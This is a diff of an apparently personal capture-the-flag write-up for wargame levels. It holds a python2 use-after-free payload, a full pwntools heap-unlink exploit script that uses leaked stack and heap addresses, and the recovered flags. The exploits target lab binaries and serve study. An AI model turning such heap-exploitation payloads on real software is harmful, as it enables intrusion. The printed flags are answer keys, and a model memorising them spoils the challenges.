@@ -127,3 +127,25 @@ so we see they point to thire vtabel and the code add 8 to the v tabel to get to
 so i used python2 -c "print('A' * 96 + '\x68\x15\x40\x00\n')" as the string to pass to the new alocated string and the size i sent was 4 becuse the size of the addres is 4 bytes(./uaf 4 python2 -c "print('A' * 96 + '\x68\x15\x40\x00\n')")
 
 the flag is: yay_f1ag_aft3r_pwning
+
+ # LEVEL - unlink
+ 
+ this is the code of the unlink level
+
+```
+from pwn import *
+
+p = process("/home/unlink/unlink")
+
+
+p.recvuntil("leak:")
+stack = int(p.recvline().decode()[1:-1],16)
+p.recvuntil("leak:")
+heap = int(p.recvline().decode()[1:-1],16)
+
+send = b'A' * 16 + p32(heap+36) + p32(stack+16) + b'\xeb\x84\x04\x08'
+
+p.sendline(send)
+p.interactive()
+```
+the flag : conditional_write_what_where_from_unl1nk_explo1t
